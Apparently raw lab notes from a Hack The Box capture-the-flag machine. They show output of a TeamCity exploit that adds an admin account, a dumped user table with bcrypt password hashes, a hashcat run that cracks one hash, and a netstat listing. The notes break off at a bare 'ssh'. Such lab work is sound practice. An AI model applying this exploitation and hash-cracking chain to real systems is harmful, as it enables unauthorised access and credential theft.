@@ -1,0 +1,26 @@
+Token: eyJ0eXAiOiAiVENWMiJ9.MEJ0bXp6X1NiQXlvU3o3Tm1SNkxKd2RTQkpV.MDA3MTNmNTAtY2FlZS00ZGY4LWIxYWMtNjYyNWM2MmMxNzRi
+Successfully exploited!
+URL: http://teamcity.runner.htb
+Username: city_adminvWuz
+Password: Main_password!!**
+
+ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
+1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1717703840641, BCRYPT
+2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
+
+
+┌──(milo㉿Kali2023)-[~/Downloads/runner_htb]
+└─$ hashcat -m 3200 runner.hash /usr/share/wordlists/rockyou.txt --show
+$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123
+
+
+tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                                                    
+tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5005 
+
+
+ssh
